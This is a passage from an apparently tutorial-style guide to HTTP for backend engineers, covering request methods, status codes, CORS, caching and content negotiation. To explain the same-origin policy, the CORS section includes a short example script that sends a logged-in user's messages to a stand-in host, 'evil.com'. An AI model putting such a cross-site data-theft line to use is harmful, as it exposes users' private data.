Result: Updated ✓

PUT /api/users/123 (2nd time - SAME)
{"name": "Rahul", "email": "rahul@gmail.com"}
Result: Updated (data already same) ✓

Same final state! Idempotent ✓
```

**Real-World Analogy**
```
File Replacement:
PUT = Replace entire file
- Delete old document.txt
- Create new document.txt
- All old content gone
```

---

### PATCH Method

**Definition**: Partially update resource.

**Purpose**: Update only specific fields.

**Characteristics**
```
✗ NOT Safe (modifies)
⚠️ Conditionally Idempotent
✗ NOT Cacheable
✓ Has body (only changed fields)
```

**When to Use**
- Partial updates
- Changing one/few fields
- Don't have complete resource
- Efficient updates

**Syntax**
```
PATCH /resource/id HTTP/1.1
Content-Type: application/json

{only changed fields}
```

**Example 1: Update only email**
```
EXISTING:
{
  "id": 123,
  "name": "Rahul Kumar",
  "email": "old@gmail.com",
  "age": 25,
  "city": "Mumbai"
}

REQUEST:
PATCH /api/users/123 HTTP/1.1

{
  "email": "new@gmail.com"
}

Only 1 field!

RESPONSE:
{
  "id": 123,
  "name": "Rahul Kumar",    ← Unchanged ✓
  "email": "new@gmail.com", ← Changed ✓
  "age": 25,                ← Unchanged ✓
  "city": "Mumbai"          ← Unchanged ✓
}

Only email updated, rest preserved!
```

**Example 2: Instagram caption**
```
EXISTING:
{
  "id": 9876,
  "caption": "Old caption",
  "likes": 150,
  "comments": 25
}

REQUEST:
PATCH /api/posts/9876

{
  "caption": "Updated caption!"
}

RESPONSE:
{
  "id": 9876,
  "caption": "Updated caption!", ← Changed
  "likes": 150,                  ← Unchanged
  "comments": 25                 ← Unchanged
}
```

**PUT vs PATCH - Clear Difference**

**Scenario: Update email only**
```
EXISTING:
{
  "name": "Rahul",
  "email": "old@gmail.com",
  "age": 25,
  "city": "Mumbai"
}
```

**Using PUT (must send ALL)**
```
PUT /api/users/123

{
  "name": "Rahul",           ← Must repeat
  "email": "new@gmail.com",  ← Changed
  "age": 25,                 ← Must repeat
  "city": "Mumbai"           ← Must repeat
}

Tedious! Must send everything!
```

**Using PATCH (only changed)**
```
PATCH /api/users/123

{
  "email": "new@gmail.com"
}

Efficient! Only changed field ✓
```

**PATCH is Safer**
```
PUT - If forget field:
{
  "name": "Rahul",
  "email": "new@gmail.com"
}

Result:
{
  "name": "Rahul",
  "email": "new@gmail.com",
  "age": null,    ← LOST! ❌
  "city": null    ← LOST! ❌
}

---

PATCH - If forget:
{
  "email": "new@gmail.com"
}

Result:
{
  "name": "Rahul",           ← Safe ✓
  "email": "new@gmail.com",  ← Updated ✓
  "age": 25,                 ← Safe ✓
  "city": "Mumbai"           ← Safe ✓
}

Only specified fields update!
```

**Real-World Analogy**
```
Editing Document:

PUT = Replace entire document
- Delete old
- Write new from scratch
- Must rewrite everything

PATCH = Edit specific lines
- Open document
- Change line 5
- Save
- Rest unchanged
```

---

### DELETE Method

**Definition**: Remove resource.

**Purpose**: Delete existing resource.

**Characteristics**
```
✗ NOT Safe (modifies)
✓ Idempotent (same result)
✗ NOT Cacheable
✗ Usually no body
```

**When to Use**
- Removing resources
- Deleting accounts
- Removing posts
- Cleanup

**Syntax**
```
DELETE /resource/id HTTP/1.1
```

**Example 1: Delete user**
```
REQUEST:
DELETE /api/users/123 HTTP/1.1

RESPONSE:
HTTP/1.1 204 No Content

(Empty body, just confirmation)
User 123 deleted ✓
```

**Example 2: Delete post**
```
REQUEST:
DELETE /api/posts/9876 HTTP/1.1
Authorization: Bearer token123

RESPONSE:
HTTP/1.1 200 OK

{
  "success": true,
  "message": "Post deleted"
}
```

**Why Idempotent**
```
DELETE /api/users/123 (1st time)
Response: 204 No Content
User deleted ✓

DELETE /api/users/123 (2nd time)
Response: 404 Not Found
Already deleted

DELETE /api/users/123 (3rd time)
Response: 404 Not Found
Still deleted

Final state same: User doesn't exist ✓
Idempotent!
```

**Soft Delete vs Hard Delete**

**Hard Delete:**
```
DELETE /api/users/123

Server:
- Removes from database
- Data permanently gone
- Cannot recover

Use: Spam, temporary data
```

**Soft Delete:**
```
DELETE /api/users/123

Server:
- Marks as deleted (deleted=true)
- Data still in database
- Can recover

Database:
{
  "id": 123,
  "name": "Rahul",
  "deleted": true,      ← Marked
  "deletedAt": "2026-02-08"
}

Use: User accounts (restore within 30 days)
```

**Real-World Analogy**
```
Email:

Hard Delete: Permanently remove
- Cannot recover
- Like shredding paper

Soft Delete: Move to Trash
- Can restore within 30 days
- Then permanent delete
```

---

### Methods Comparison Table

| Method | Purpose | Body | Safe | Idempotent | Use Case |
|--------|---------|------|------|------------|----------|
| **GET** | Fetch | ❌ | ✅ | ✅ | Read profiles, search |
| **POST** | Create | ✅ | ❌ | ❌ | Register, login, create |
| **PUT** | Replace all | ✅ | ❌ | ✅ | Update entire profile |
| **PATCH** | Update partial | ✅ | ❌ | ⚠️ | Update email, password |
| **DELETE** | Remove | ❌ | ❌ | ✅ | Delete account, post |

---

### CRUD Operations

**CRUD** = Create, Read, Update, Delete

```
CREATE  → POST
READ    → GET
UPDATE  → PUT (complete) or PATCH (partial)
DELETE  → DELETE
```

**Complete API Example: User Management**
```
1. Create User:
   POST /api/users
   Body: {name, email, password}

2. Get All Users:
   GET /api/users

3. Get Single User:
   GET /api/users/123

4. Update Complete:
   PUT /api/users/123
   Body: {name, email, age, city} (all)

5. Update Partial:
   PATCH /api/users/123
   Body: {email} (only changed)

6. Delete User:
   DELETE /api/users/123
```

---

## 2. HTTP Status Codes

### What Are Status Codes?

**Definition**: Three-digit numbers indicating request result.

**Theory**
Status codes are like result messages. They tell client what happened without parsing response body. Standardized across all servers.

**Format**: `Code Text`

**Categories**
```
1xx: Informational (processing)
2xx: Success
3xx: Redirection
4xx: Client Error
5xx: Server Error
```

**Real-World Analogy**
```
Food Delivery:

200 = "Order delivered!" ✓
400 = "Invalid address" (your fault)
404 = "Restaurant not found"
500 = "Our system crashed" (not your fault)
```

---

### 1xx - Informational

**100 Continue**

**Definition**: Server received headers, send body.

**Use**: Large file uploads.

**Example**
```
Large Upload:

REQUEST (headers):
POST /upload HTTP/1.1
Content-Length: 100000000
Expect: 100-continue

RESPONSE:
HTTP/1.1 100 Continue

Client: "OK, now upload file"
[100 MB file...]

RESPONSE:
HTTP/1.1 201 Created
```

**101 Switching Protocols**

**Definition**: Switching to different protocol (WebSocket).

**Example**
```
REQUEST:
GET /chat HTTP/1.1
Upgrade: websocket

RESPONSE:
HTTP/1.1 101 Switching Protocols

Now using WebSocket! ✓
```

---

### 2xx - Success

**200 OK**

**Definition**: Success, here's data.

**Most common** success code.

**Example**
```
GET /api/users/123

HTTP/1.1 200 OK
{"id": 123, "name": "Rahul"}
```

**201 Created**

**Definition**: New resource created.

**Should include**: Location header.

**Example**
```
POST /api/users
{"name": "Rahul"}

HTTP/1.1 201 Created
Location: /api/users/124

{"id": 124, "name": "Rahul"}
```

**204 No Content**

**Definition**: Success, no data to return.

**Example**
```
DELETE /api/users/123

HTTP/1.1 204 No Content

(No body)
```

---

### 3xx - Redirection

**301 Moved Permanently**

**Definition**: Resource permanently moved.

**Example**
```
Old: example.com/old-page

GET /old-page

HTTP/1.1 301 Moved Permanently
Location: /new-page

Browser auto-redirects ✓
Updates bookmarks ✓
```

**302 Found (Temporary)**

**Definition**: Temporarily at different URL.

**Example**
```
GET /product

HTTP/1.1 302 Found
Location: /special-offer

Browser redirects temporarily
Next time tries original URL
```

**304 Not Modified**

**Definition**: Cached version still valid.

**Example**
```
First:
GET /image.jpg
ETag: "abc123"
[Image]

Later:
GET /image.jpg
If-None-Match: "abc123"

HTTP/1.1 304 Not Modified
(Use cache, no body!)
```

---

### 4xx - Client Errors

**400 Bad Request**

**Definition**: Request is malformed/invalid.

**Examples**
```
Invalid JSON:
POST /api/users
{"name": "Rahul", "age": "twenty"} ← String not number

HTTP/1.1 400 Bad Request
{"error": "age must be number"}

---

Missing field:
POST /api/users
{"name": "Rahul"}  ← email missing

HTTP/1.1 400 Bad Request
{"error": "email required"}
```

**401 Unauthorized**

**Definition**: Authentication required/failed.

**Note**: Should be "Unauthenticated"!

**Examples**
```
No credentials:
GET /api/profile

HTTP/1.1 401 Unauthorized
{"error": "Login required"}

---

Invalid token:
GET /api/profile
Authorization: Bearer invalid

HTTP/1.1 401 Unauthorized
{"error": "Invalid token"}

---

Expired:
Authorization: Bearer expired

HTTP/1.1 401 Unauthorized
{"error": "Token expired, login again"}

---

Wrong password:
POST /api/login
{"password": "wrong"}

HTTP/1.1 401 Unauthorized
{"error": "Invalid credentials"}
```

**403 Forbidden**

**Definition**: Authenticated but not authorized (no permission).

**Difference from 401**:
- 401: Who are you? (not logged in)
- 403: I know you, but you can't do this! (no permission)

**Examples**
```
Insufficient role:
DELETE /api/users/123
Authorization: Bearer user-token

HTTP/1.1 403 Forbidden
{"error": "Only admins can delete users"}

Logged in ✓ but not admin ✗

---

Not your resource:
DELETE /api/posts/9876
Authorization: Bearer user-123-token

HTTP/1.1 403 Forbidden
{"error": "Can only delete own posts"}

Post belongs to user-456

---

Account suspended:
GET /api/profile
Authorization: Bearer suspended-token

HTTP/1.1 403 Forbidden
{"error": "Account suspended"}
```

**Real-World**: Employee trying to enter CEO cabin - you work here (authenticated) but can't enter (not authorized).

**404 Not Found**

**Definition**: Resource doesn't exist.

**Most famous** code!

**Examples**
```
Wrong ID:
GET /api/users/99999

HTTP/1.1 404 Not Found
{"error": "User not found"}

---

Deleted:
GET /api/posts/123

HTTP/1.1 404 Not Found
{"error": "Post deleted"}

---

Wrong endpoint:
GET /api/userss/123  ← Typo

HTTP/1.1 404 Not Found
{"error": "Endpoint not found"}
```

**405 Method Not Allowed**

**Definition**: HTTP method not supported.

**Example**
```
PUT /api/users/123  ← Only GET/PATCH allowed

HTTP/1.1 405 Method Not Allowed
Allow: GET, PATCH

{"error": "PUT not supported, use PATCH"}
```

**409 Conflict**

**Definition**: Request conflicts with current state.

**Examples**
```
Duplicate email:
POST /api/users
{"email": "rahul@gmail.com"}

HTTP/1.1 409 Conflict
{"error": "Email already exists"}

---

Duplicate folder:
POST /api/folders
{"name": "Documents"}

HTTP/1.1 409 Conflict
{"error": "Folder exists"}

---

Username taken:
POST /api/register
{"username": "rahul123"}

HTTP/1.1 409 Conflict
{"error": "Username taken"}
```

**429 Too Many Requests**

**Definition**: Rate limit exceeded.

**Example**
```
Rate limit: 60 requests/minute

Request #61:

HTTP/1.1 429 Too Many Requests
Retry-After: 30

{"error": "Rate limit exceeded, try in 30s"}
```

**Real-World**: ATM limiting withdrawals - "Max 5 per day, come tomorrow".

---

### 5xx - Server Errors

**500 Internal Server Error**

**Definition**: Generic server error.

**Examples**
```
Code crash:
GET /api/users/123

Server:
user = database.getUser(123)
user.name.toUpperCase()  ← user is null! Crash!

HTTP/1.1 500 Internal Server Error
{"error": "Something went wrong"}

(Don't expose actual error!)

---

Database error:
POST /api/users

Server: Database connection failed

HTTP/1.1 500 Internal Server Error
{"error": "Unable to process"}
```

**Real-World**: Restaurant kitchen catching fire - not customer's fault!

**502 Bad Gateway**

**Definition**: Proxy got invalid response from upstream.

**Example**
```
Browser → Nginx → Backend (DOWN!)

HTTP/1.1 502 Bad Gateway

Nginx: "Cannot reach backend"
```

**503 Service Unavailable**

**Definition**: Server temporarily cannot handle request.

**Examples**
```
Maintenance:
HTTP/1.1 503 Service Unavailable
Retry-After: 3600

{"error": "Maintenance, try in 1 hour"}

---

Overloaded:
HTTP/1.1 503 Service Unavailable
{"error": "Server overloaded"}
```

**Real-World**: Restaurant full - "No tables, come in 1 hour".

**504 Gateway Timeout**

**Definition**: Proxy didn't get response in time.

**Example**
```
Browser → Nginx (30s timeout) → Slow Backend

Backend takes 45s...

HTTP/1.1 504 Gateway Timeout

Nginx: "Backend didn't respond in 30s"
```

---

### Status Code Selection Guide

```
Creating:
✓ Success → 201 Created
✗ Invalid data → 400 Bad Request
✗ Already exists → 409 Conflict
✗ Unauthorized → 401

Fetching:
✓ Found → 200 OK
✗ Not found → 404
✗ Not logged in → 401
✗ No permission → 403

Updating:
✓ Updated → 200 OK or 204
✗ Not found → 404
✗ Invalid → 400
✗ Not yours → 403

Deleting:
✓ Deleted → 204 or 200
✗ Not found → 404
✗ Cannot delete → 403

Server issues:
✗ Crash → 500
✗ Backend down → 502
✗ Timeout → 504
✗ Maintenance → 503
```

---

## 3. CORS & Pre-flight Requests

### What is CORS?

**Definition**: CORS (Cross-Origin Resource Sharing) is security mechanism controlling how web pages from one domain access resources from another.

**Theory**
Browsers have "Same-Origin Policy" that blocks cross-domain requests. CORS is way for servers to allow specific cross-origin requests.

**Technical Terms**
- **Origin**: Protocol + Domain + Port
- **Same-Origin**: All three match
- **Cross-Origin**: Any one different
- **CORS**: Mechanism to allow cross-origin

### Same-Origin Policy

**Definition**: Security restriction - pages can only request from same origin.

**What is Same Origin?**
```
Origin = Protocol + Domain + Port

https://example.com:443
```

**Same-Origin Examples**
```
https://example.com:443/page1
https://example.com:443/page2
✓ SAME (all match)
```

**Different-Origin Examples**
```
https://example.com
http://example.com
✗ DIFFERENT (protocol: https vs http)

https://example.com
https://api.example.com
✗ DIFFERENT (subdomain)

https://example.com:443
https://example.com:8080
✗ DIFFERENT (port)

https://example.com
https://another.com
✗ DIFFERENT (domain)
```

**Real Scenario**
```
Website: https://mysite.com
API: https://api.mysite.com

Browser blocks by default!
Need CORS ✓
```

### Why CORS Exists?

**Problem without CORS**
```
Malicious site: https://evil.com

Script:
fetch('https://facebook.com/api/messages')
  .then(data => sendTo('evil.com', data))

If logged into Facebook, this would steal data!
CORS prevents this ✓
```

---

### Two Types of CORS Requests

### 1. Simple Requests

**Definition**: Requests that don't trigger pre-flight.

**Conditions (ALL must be true)**
```
1. Method: GET, POST, or HEAD
2. Headers: Only simple headers
3. Content-Type: 
   - application/x-www-form-urlencoded
   - multipart/form-data
   - text/plain
```

**Flow**
```
STEP 1: Browser sends
GET /api/data HTTP/1.1
Origin: https://frontend.com  ← Auto-added

STEP 2: Server responds
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://frontend.com  ← CORS!
{"data": "Hello"}

STEP 3: Browser checks
Origin matches? ✓
Allow response ✓
```

**If CORS header missing**
```
Server:
HTTP/1.1 200 OK
{"data": "Hello"}

(No Access-Control-Allow-Origin!)

Browser: "CORS error! Blocked!" ❌

Console:
"Access blocked by CORS policy"
```

**Example**
```
Frontend: https://app.mysite.com
API: https://api.mysite.com

fetch('https://api.mysite.com/users')

REQUEST:
GET /users
Origin: https://app.mysite.com

RESPONSE:
Access-Control-Allow-Origin: https://app.mysite.com

Success! ✓
```

---

### 2. Pre-flight Requests

**Definition**: Browser sends OPTIONS first to check permissions.

**When Triggered (ANY ONE)**
```
1. Method: PUT, DELETE, PATCH
2. Custom Headers: Authorization, X-Custom
3. Content-Type: application/json  ← Most common!
```

**Flow**
```
STEP 1: OPTIONS (Pre-flight)
OPTIONS /api/users HTTP/1.1
Origin: https://frontend.com
Access-Control-Request-Method: PUT  ← Asking
Access-Control-Request-Headers: Authorization

"Can I PUT with Authorization?"

STEP 2: Server permission
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization
Access-Control-Max-Age: 86400  ← Cache 24 hours

"Yes, allowed!"

STEP 3: Actual request
PUT /api/users/123
Authorization: Bearer token123
{"name": "Rahul"}

STEP 4: Normal response
HTTP/1.1 200 OK
{"success": true}
```

**Visual**
```
FRONTEND                    BACKEND
  |                            |
  | 1. fetch() with JSON       |
  |                            |
  | Browser: "Need pre-flight!"|
  |                            |
  | 2. OPTIONS                 |
  |-------------------------→ |
  | "Can I PUT with JSON?"     |
  |                            |
  | 3. Permission              |
  | ←-------------------------|
  | "Yes, allowed 24h"         |
  |                            |
  | 4. Actual PUT              |
  |-------------------------→ |
  | {data}                     |
  |                            |
  | 5. Response                |
  | ←-------------------------|
  | {"success": true}          |
```

**Real Example**
```
Frontend: https://app.example.com

fetch('https://api.example.com/users/123', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',  ← Triggers!
    'Authorization': 'Bearer token'      ← Triggers!
  },
  body: JSON.stringify({name: 'Rahul'})
})

Browser automatically:
1. Sends OPTIONS (pre-flight)
2. Waits for permission
3. Sends PUT
4. Returns response
```

**Pre-flight Details**
```
OPTIONS /api/users/123
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, Authorization

Response:
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400

"Yes, app.example.com can PUT with 
Content-Type and Authorization.
Don't ask again for 24 hours"
```

### Access-Control-Max-Age

**Definition**: How long to cache pre-flight.

**Purpose**: Avoid OPTIONS for every request.

**Example**
```
Max-Age: 86400 (24 hours)

First PUT:
- OPTIONS sent (pre-flight)
- Cached 24 hours
- PUT sent

Second PUT (within 24h):
- No OPTIONS (cached!)
- Directly PUT
- Faster! ✓

After 24h:
- OPTIONS again
- Update cache
```

**Benefits**
```
Without Max-Age:
Request 1: OPTIONS + PUT
Request 2: OPTIONS + PUT
Request 3: OPTIONS + PUT
(Slow!)

With Max-Age=86400:
Request 1: OPTIONS + PUT (cache)
Request 2: PUT only (use cache)
Request 3: PUT only
...for 24 hours
(Fast! ✓)
```

### CORS Headers

**1. Access-Control-Allow-Origin**

**Definition**: Which origins can access.

**Values**
```
Access-Control-Allow-Origin: https://frontend.com
(Only this)

Access-Control-Allow-Origin: *
(Anyone - risky!)
```

**2. Access-Control-Allow-Methods**

**Definition**: Which methods allowed.

**Example**
```
Access-Control-Allow-Methods: GET, POST, PUT, DELETE

Client can use these ✓
Cannot use PATCH (not listed) ✗
```

**3. Access-Control-Allow-Headers**

**Definition**: Which headers allowed.

**Example**
```
Access-Control-Allow-Headers: Content-Type, Authorization

Can send these ✓
Cannot send others ✗
```

**4. Access-Control-Max-Age**

**Definition**: Cache duration for pre-flight.

**Example**
```
Access-Control-Max-Age: 86400

Cache 24 hours
No repeated OPTIONS
```

---

### Summary

**Simple Request**
```
Conditions: GET/POST/HEAD + simple headers
Flow: Request → Check CORS → Response
No pre-flight
```

**Pre-flight Request**
```
Triggers: PUT/DELETE/PATCH or custom headers or JSON
Flow: OPTIONS → Permission → Actual → Response
Browser handles automatically
```

**Key Points**
```
✓ CORS is browser security
✓ Server controls access
✓ Pre-flight for non-simple
✓ Cache with Max-Age
✓ Always set Allow-Origin
✓ Use specific origins in production (not *)
```

---
# HTTP for Backend Engineers - Part 3: Caching, Compression & Advanced

## Table of Contents
1. [HTTP Caching](#1-http-caching)
2. [Content Negotiation](#2-content-negotiation)
3. [HTTP Compression](#3-http-compression)
4. [HTTP Versions](#4-http-versions)
5. [Persistent Connections](#5-persistent-connections)

---

## 1. HTTP Caching

### What is Caching?

**Definition**: Storing copies of responses to reuse instead of downloading again.

**Theory**
Caching saves bandwidth, reduces server load, makes websites faster. Instead of downloading same data repeatedly, browser/proxy stores and reuses it.

**Benefits**
```
Without Cache:
Every request: Download 2 MB image
10 requests: 20 MB downloaded
Slow! Expensive!

With Cache:
First request: Download 2 MB (cache it)
Next 9 requests: Use cache (0 MB downloaded)
Fast! Saved 18 MB! ✓
```

**Real-World Analogy**
```
Library:

Without cache:
- Go to library for book
- Read and return
- Next day, go again
- Read and return
(Waste time traveling!)

With cache:
- Go to library
- Photocopy book (cache)
- Keep at home
- Read anytime
- No more library trips
(Save time! ✓)
```

### How Caching Works

**Basic Flow**
```
FIRST REQUEST (No cache):
Browser: "Get data"
Server: "Here's data + cache info"
Browser: "Saved!"

SECOND REQUEST (Cache valid):
Browser: "Get data"
Browser: "I have cached version!"
Browser: "Use cache (no network)"

Fast! No server request! ✓
```

---

### Cache-Control Header

**Definition**: Main header controlling caching.

**Format**: `Cache-Control: directive`

**Common Directives**

**1. max-age**

**Definition**: Cache for specified seconds.

**Format**: `Cache-Control: max-age=seconds`

**Example**
```
Cache-Control: max-age=3600  (1 hour)

Browser:
- Cache response
- Valid for 3600 seconds
- After 1 hour, expires
```

**Real Example**
```
GET /api/products

HTTP/1.1 200 OK
Cache-Control: max-age=3600
[Product data]

Timeline:
0:00  - Downloaded, cached
0:30  - Use cache (valid)
1:00  - Cache expires
1:01  - Download fresh
```

**Use Cases**
```
Static images: max-age=31536000  (1 year)
CSS/JS files: max-age=86400  (1 day)
API data: max-age=300  (5 minutes)
News: max-age=60  (1 minute)
```

---

**2. no-cache**

**Definition**: Cache, but validate with server first.

**Example**
```
Cache-Control: no-cache

Browser:
- Can cache response
- But must check: "Still valid?"
- If valid: Use cache
- If changed: Download new
```

**Flow**
```
First request:
GET /data

HTTP/1.1 200 OK
Cache-Control: no-cache
ETag: "abc123"
{"data": "Hello"}

Browser caches ✓

Second request:
GET /data
If-None-Match: "abc123"

If unchanged:
HTTP/1.1 304 Not Modified
(Use cache)

If changed:
HTTP/1.1 200 OK
ETag: "xyz789"
{"data": "Updated"}
```

---

**3. no-store**

**Definition**: Don't cache at all.

**Example**
```
Cache-Control: no-store

Browser:
- Don't cache
- Always download fresh
- Forget after use
```

**Use Cases**
```
Bank balance: no-store
Passwords: no-store
Sensitive data: no-store
Private info: no-store
```

---

**4. public**

**Definition**: Anyone can cache (CDN, proxy, browser).

**Example**
```
Cache-Control: public, max-age=86400

Can be cached by:
✓ Browser
✓ CDN (Cloudflare)
✓ Proxy servers
✓ Intermediate caches
```

**Use Cases**
```
Public images: public, max-age=31536000
Public CSS/JS: public, max-age=86400
Public API: public, max-age=300
```

---

**5. private**

**Definition**: Only browser can cache (not CDN/proxy).

**Example**
```
Cache-Control: private, max-age=3600

Can cache:
✓ Browser only

Cannot cache:
✗ CDN
✗ Proxy
✗ Shared caches
```

**Use Cases**
```
User profile: private, max-age=300
Personal data: private, max-age=60
User settings: private, max-age=600
```

---

### ETag (Entity Tag)

**Definition**: Unique identifier for resource version (hash).

**Theory**
ETag is like version number or fingerprint. Server calculates from response content. If content changes, ETag changes.

**How Generated**
```javascript
response = {id: 123, name: "Rahul"}
responseString = JSON.stringify(response)
etag = md5(responseString)  // Hash
// ETag: "5d41402abc4b2a76b9719d911017c592"
```

**Complete Flow**

```
FIRST REQUEST:
GET /api/user/123

RESPONSE:
HTTP/1.1 200 OK
ETag: "abc123"
Cache-Control: max-age=3600

{
  "id": 123,
  "name": "Rahul",
  "email": "rahul@gmail.com"
}

Browser stores:
- Data
- ETag: "abc123"
- Expires: 1 hour

──────────────────────

AFTER 1 HOUR (expired):

REQUEST:
GET /api/user/123
If-None-Match: "abc123"  ← Stored ETag

Server checks:
- Current ETag: "abc123"
- Received: "abc123"
- Match! Unchanged!

RESPONSE:
HTTP/1.1 304 Not Modified
ETag: "abc123"

(No body! Saves bandwidth!)

Browser: "Use cached version ✓"

──────────────────────

IF DATA UPDATED:

User changed name

REQUEST:
If-None-Match: "abc123"

Server checks:
- Current ETag: "xyz789"  (changed!)
- Received: "abc123"
- Don't match! Changed!

RESPONSE:
HTTP/1.1 200 OK
ETag: "xyz789"  ← New

{
  "name": "Rahul Kumar",  ← Updated
  ...
}

Browser: "New data, update cache"
```

**Benefits**
```
Data unchanged:
- 304 response (no body)
- Saves bandwidth ✓
- Fast (just compare ETag) ✓

Data changed:
- 200 response (with body)
- Fresh data ✓
- Update cache
```

---

### Last-Modified

**Definition**: Date/time when resource last modified.

**Theory**
Older validation method (before ETag). Server tells when resource updated. Client asks "changed since this date?"

**Flow**

```
FIRST REQUEST:
GET /image.jpg

RESPONSE:
HTTP/1.1 200 OK
Last-Modified: Sun, 08 Feb 2026 10:00:00 GMT
Cache-Control: max-age=3600

[Image data]

Browser stores:
- Image
- Last modified: Feb 08, 10:00
- Expires: 1 hour

──────────────────────

AFTER 1 HOUR:

REQUEST:
GET /image.jpg
If-Modified-Since: Sun, 08 Feb 2026 10:00:00 GMT

Server checks:
- Last modified: Feb 08, 10:00
- Received: Feb 08, 10:00
- Same! Not modified!

RESPONSE:
HTTP/1.1 304 Not Modified

(No body!)

──────────────────────

IF MODIFIED:

Image updated at 11:30

REQUEST:
If-Modified-Since: Sun, 08 Feb 2026 10:00:00 GMT

Server checks:
- Last modified: Feb 08, 11:30
- Received: Feb 08, 10:00
- Different! Modified!

RESPONSE:
HTTP/1.1 200 OK
Last-Modified: Sun, 08 Feb 2026 11:30:00 GMT

[New image]
```

**Comparison**
```
ETag:
✓ More accurate (hash)
✓ Detects any change
✗ Needs computation

Last-Modified:
✓ Simple (timestamp)
✗ Only 1-second precision
✗ Can miss rapid changes
```

---

### Cache Validation Timeline

```
TIME: 0:00
Request: GET /data
Response:
  Cache-Control: max-age=3600
  ETag: "abc123"
  Data: {value: "Hello"}

Browser: "Cached for 1 hour"

TIME: 0:30
Request: GET /data
Browser: "Cache valid (30 mins old)"
Browser: "Use cached data" ✓
NO network!

TIME: 1:00
Request: GET /data
Browser: "Cache expired"
Browser: "Validate with server"

Validation:
GET /data
If-None-Match: "abc123"

If unchanged:
  304 Not Modified
  Browser: "Use cache" ✓

If changed:
  200 OK
  ETag: "xyz789"
  Browser: "Update cache" ✓
```

---

### Caching Strategies

**Strategy 1: Long Cache (Static)**
```
Use for: Images, CSS, JS

Cache-Control: public, max-age=31536000  (1 year)

Benefits:
- Cache very long
- CDN can cache
- Fast for users
- Low server load

Versioning:
app.js?v=1.0.0  (change version when updated)
or
app.a8f3d2.js  (hash in filename)
```

**Strategy 2: Short Cache (Dynamic)**
```
Use for: User profiles, feeds

Cache-Control: private, max-age=300  (5 mins)

Benefits:
- Fresh enough
- Reduces requests
- User-specific
```

**Strategy 3: No Cache (Sensitive)**
```
Use for: Bank balance, passwords

Cache-Control: no-store

Benefits:
- Always fresh
- No sensitive data stored
- Secure
```

**Strategy 4: Validate Always**
```
Use for: News, stock prices

Cache-Control: no-cache
ETag: "def456"

Benefits:
- Can cache for offline
- But always validates
- Balance freshness and speed
```

---

### Real Examples

**Example 1: Instagram Feed**
```
GET /api/feed

HTTP/1.1 200 OK
Cache-Control: private, max-age=60
ETag: "feed-v123"

[20 posts]

Browser:
- Cache 1 minute
- After 1 min, validate
- If unchanged (rare), use cache
- If changed (common), download new
```

**Example 2: Profile Picture**
```
GET /images/profile-123.jpg

HTTP/1.1 200 OK
Cache-Control: public, max-age=86400
ETag: "img-abc"

[Image]

Browser:
- Cache 1 day
- CDN can cache too
- If user changes picture, URL changes:
  profile-123.jpg?v=2
```

**Example 3: Product List**
```
GET /api/products

HTTP/1.1 200 OK
Cache-Control: public, max-age=300
ETag: "products-xyz"

[100 products]

Browser & CDN:
- Cache 5 minutes
- Many users see same
- Reduces server load
- After 5 mins, validate
```

---

### Summary

**Key Concepts**
```
Cache-Control: How long to cache
max-age: Duration
no-cache: Validate first
no-store: Don't cache
public/private: Who can cache

ETag: Resource version (hash)
Last-Modified: Update timestamp

Validation:
- If-None-Match (with ETag)
- If-Modified-Since (with Last-Modified)

304 Not Modified: Use cache
200 OK: New data
```

**Benefits**
```
✓ Faster loads
✓ Less bandwidth
✓ Lower server load
✓ Better UX
✓ Cost savings
```

---

## 2. Content Negotiation

### What is Content Negotiation?

**Definition**: Process where client and server agree on best format for data exchange.

**Theory**
Different clients prefer different formats (JSON vs XML), languages (English vs Hindi), encodings (gzip vs brotli). Content negotiation allows communication of preferences.

**Types**
1. Media Type (JSON, XML, HTML)
2. Language (English, Hindi)
3. Encoding (gzip, brotli)

---

### 1. Media Type Negotiation

**Headers**:
- Client → Server: `Accept`
- Server → Client: `Content-Type`

**Flow**
```
REQUEST:
GET /api/user/123
Accept: application/json

"I want JSON"

RESPONSE:
HTTP/1.1 200 OK
Content-Type: application/json

{"id": 123, "name": "Rahul"}
```

**Multiple Formats**
```
REQUEST 1 (JSON):
Accept: application/json

RESPONSE:
Content-Type: application/json
{"id": 123, "name": "Rahul"}

──────────────

REQUEST 2 (XML):
Accept: application/xml

RESPONSE:
Content-Type: application/xml
<user><id>123</id><name>Rahul</name></user>

──────────────

REQUEST 3 (HTML):
Accept: text/html

RESPONSE:
Content-Type: text/html
<html><body><h1>Rahul</h1></body></html>
```

**Common Media Types**
```
application/json  - JSON
application/xml   - XML
text/html        - HTML
text/plain       - Plain text
image/jpeg       - JPEG
image/png        - PNG
application/pdf  - PDF
video/mp4        - Video
```

---

### 2. Language Negotiation

**Headers**:
- Client → Server: `Accept-Language`
- Server → Client: `Content-Language`

**Flow**
```
REQUEST (Hindi):
GET /greeting
Accept-Language: hi-IN

RESPONSE:
Content-Language: hi
{"message": "नमस्ते! कैसे हैं?"}

──────────────

REQUEST (English):
Accept-Language: en-US

RESPONSE:
Content-Language: en
{"message": "Hello! How are you?"}
```

**Priority**
```
Accept-Language: hi-IN, en-US;q=0.9, es;q=0.8

Means:
1st: Hindi (India)
2nd: English (US) - quality 0.9
3rd: Spanish - quality 0.8

Server picks based on availability
```

**Real Example**
```
User in India:
Accept-Language: hi-IN, en-US

Website shows:
- Menu: "होम, विषय, संपर्क"
- Content: Hindi

User in USA:
Accept-Language: en-US

Website shows:
- Menu: "Home, About, Contact"
- Content: English
```

---

### 3. Encoding Negotiation

**Headers**:
- Client → Server: `Accept-Encoding`
- Server → Client: `Content-Encoding`

**Flow**
```
REQUEST:
GET /large-file.json
Accept-Encoding: gzip, deflate, br

"I support these compressions"

RESPONSE:
HTTP/1.1 200 OK
Content-Encoding: gzip
Content-Length: 3800  (compressed)

[Compressed data]

Browser auto-decompresses
```

**Compression Formats**
```
gzip     - Most common
deflate  - Similar to gzip
br       - Brotli, best compression
identity - No compression
```

**Example**
```
Without compression:
Accept-Encoding: identity

Response:
Content-Length: 26000000  (26 MB)

──────────────

With compression:
Accept-Encoding: gzip

Response:
